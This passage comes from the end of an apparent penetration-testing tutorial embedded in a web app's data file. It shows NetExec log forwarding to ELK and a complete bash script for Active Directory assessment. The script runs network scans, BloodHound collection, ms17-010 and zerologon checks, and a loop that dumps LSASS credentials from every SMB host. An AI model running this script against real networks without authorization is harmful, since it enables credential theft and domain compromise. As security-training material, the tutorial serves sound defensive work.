## 11. Integration with ELK Stack for Log Analysis

Send NetExec logs to ELK Stack for centralized analysis:

\`\`\`bash
# Configure Filebeat to monitor NetExec logs
cat > filebeat.yml << EOF
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - ~/.netexec/logs/*.log
output.elasticsearch:
  hosts: ["localhost:9200"]
EOF

# Run NetExec with detailed logging
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' -d CORP --verbose
\`\`\`

## 12. Building a Comprehensive Assessment Pipeline

Create a comprehensive script combining all these tools:

\`\`\`bash
#!/bin/bash
# Comprehensive AD Assessment Script
# Usage: ./ad_assessment.sh domain.com 192.168.1.0/24 user password

DOMAIN=$1
RANGE=$2
USERNAME=$3
PASSWORD=$4
OUTPUT_DIR="assessment_$(date +%Y%m%d)"
mkdir -p $OUTPUT_DIR

echo "[+] Starting assessment of $DOMAIN ($RANGE)"

# 1. Initial discovery with Nmap
echo "[+] Running Nmap discovery..."
nmap -p 53,88,389,445,636,3268,3269,5985 --open $RANGE -oA $OUTPUT_DIR/nmap

# 2. Extract hosts by service
grep "445/open" $OUTPUT_DIR/nmap.gnmap | cut -d " " -f 2 > $OUTPUT_DIR/smb-hosts.txt
grep "389/open" $OUTPUT_DIR/nmap.gnmap | cut -d " " -f 2 > $OUTPUT_DIR/ldap-hosts.txt

# 3. NetExec enumeration
echo "[+] Running NetExec enumeration..."
netexec smb @$OUTPUT_DIR/smb-hosts.txt -u $USERNAME -p $PASSWORD -d $DOMAIN --shares --pass-pol --csv $OUTPUT_DIR/smb

# 4. Run BloodHound collection
echo "[+] Collecting BloodHound data..."
netexec ldap @$OUTPUT_DIR/ldap-hosts.txt -u $USERNAME -p $PASSWORD -d $DOMAIN -M bloodhound -o COLLECTION_METHOD=All ZIP_FILENAME=$OUTPUT_DIR/bloodhound.zip

# 5. Check for common vulnerabilities
echo "[+] Checking for vulnerabilities..."
netexec smb @$OUTPUT_DIR/smb-hosts.txt -u $USERNAME -p $PASSWORD -d $DOMAIN -M ms17-010 --csv $OUTPUT_DIR/ms17-010
netexec smb @$OUTPUT_DIR/smb-hosts.txt -u $USERNAME -p $PASSWORD -d $DOMAIN -M zerologon --csv $OUTPUT_DIR/zerologon

# 6. Credential harvesting (be careful with this)
echo "[+] Extracting credentials from accessible systems..."
for HOST in $(cat $OUTPUT_DIR/smb-hosts.txt); do
  netexec smb $HOST -u $USERNAME -p $PASSWORD -d $DOMAIN -M lsassy >> $OUTPUT_DIR/credentials.txt
done

echo "[+] Assessment complete. Results in $OUTPUT_DIR"
\`\`\`

## Conclusion

Integrating NetExec with other security tools creates powerful workflows for comprehensive security assessments. The automation capabilities provided by these integrations make it possible to efficiently test large environments while maintaining consistency and thoroughness.

Remember that these advanced techniques should only be used in authorized security assessments and penetration tests. Always ensure you have proper permissions before conducting any security testing activities.
    `,
    level: 'advanced',
    readTime: 55,
    tags: ['integration', 'workflows', 'tools']
  }
];
